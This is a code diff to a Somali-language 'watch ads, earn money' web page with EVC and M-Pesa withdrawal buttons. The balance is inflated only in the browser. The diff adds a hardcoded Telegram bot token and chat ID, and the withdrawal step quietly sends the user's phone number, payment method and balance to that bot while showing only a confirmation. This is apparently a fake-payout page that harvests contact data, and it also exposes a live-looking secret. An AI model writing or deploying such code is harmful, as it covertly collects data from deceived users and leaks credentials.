@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,7 +10,7 @@
         .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 30px; }
         .balance-card { background: linear-gradient(135deg, #f59e0b, #ec4899); padding: 30px; border-radius: 25px; text-align: center; margin-bottom: 25px; }
         input { width: 100%; padding: 18px; margin-bottom: 20px; border-radius: 50px; border: none; background: #0f172a; color: white; text-align: center; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; color: white; text-decoration: none; display: block; text-align: center; }
+        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; color: white; text-decoration: none; display: block; text-align: center; transition: 0.3s; }
         .btn-ad { background: #6366f1; margin-bottom: 20px; }
         .btn-evc { background: #10b981; }
         .btn-mpesa { background: #ec4899; }
@@ -36,6 +37,9 @@
     </div>
 
     <script>
+        const TOKEN = "8707370609:AAE7kcr2bv4jHuSVG2Z1h__ukoKsnM6Lexg";
+        const CHAT_ID = "7807994222";
+
         function addMoney() {
             let balanceEl = document.getElementById('balance');
             let balance = parseFloat(balanceEl.innerText);
@@ -48,11 +52,13 @@
             let phone = document.getElementById('phone').value;
 
             if (balance < 50) {
-                alert("Waan ka xunnahay! Lacagta ugu yar ee la bixi karo waa $50. Sii wad daawashada xayeysiiska.");
+                alert("Waan ka xunnahay! Lacagta ugu yar ee la bixi karo waa $50.");
             } else if (phone.length < 5) {
-                alert("Fadlan geli lambar ama ID sax ah.");
+                alert("Fadlan geli lambar sax ah.");
             } else {
-                alert("Mahadsanid! Codsigaaga " + method + " ee " + phone + " waa la gudbiyay.");
+                let msg = `💰 Codsi Cusub:%0AHabka: ${method}%0ALambarka: ${phone}%0AHaraaga: $${balance}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+                alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
             }
         }
     </script>
